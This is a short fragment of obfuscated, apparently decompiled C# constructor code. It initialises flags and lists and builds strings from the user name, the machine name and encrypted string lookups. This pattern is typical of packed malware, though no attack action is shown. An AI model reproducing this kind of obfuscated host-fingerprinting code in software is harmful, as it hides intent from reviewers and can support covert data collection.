		LImNkSPhwOOQHW = getString_0(107412613);
		hIFJbdEMJudY = false;
		uJePXmmfyrV = false;
		QNcazMBOlHTTBH = false;
		WRwAKzNShnoL = false;
		wRVzxmISkhBzKR = true;
		mqQgvSYgrlnpSvAge = getString_0(107412624) + Environment.UserName + getString_0(107413091) + Environment.MachineName + getString_0(107413070) + YarXNhsRIUck.FgehTUZSzpVn() + getString_0(107413065);
		qqVKUcwYqRObMU = false;
		UNPGQjVMpE = new Stopwatch();
		gmdqiJfLiKSG = 0;
		DnHtYVwZFeaR = 0;
		eSjMTjCatON = false;
		BBDxmQurRdVswG = getString_0(107413056) + YarXNhsRIUck.FgehTUZSzpVn() + getString_0(107413079);
		CCiaOWbaRz = new string[1] { getString_0(107413074) };
		yDNKtVeuKTBPdF = new List<string>();
		bcPffxszCs = 0;
		DHzgvUPuaGcJ = false;
		ShkWUIXYoOWB = true;
		AbzhPXXcXCCr = false;
		fiNlreSRwIMD = false;
		IeiMhxonCbw = false;
		kXcVqGPhsGu = false;
		LprhUPIkKugxdZ = new List<string>();
		fOCEhEMJTPme = getString_0(107412953);
		CuCRTFRskQOdHM = true;
		JPkRLvIGNCy = new List<string>();
		WisYbFelSli = new List<string>();
		qbJtaXaxLuUIqG = new List<string>();
	}
}
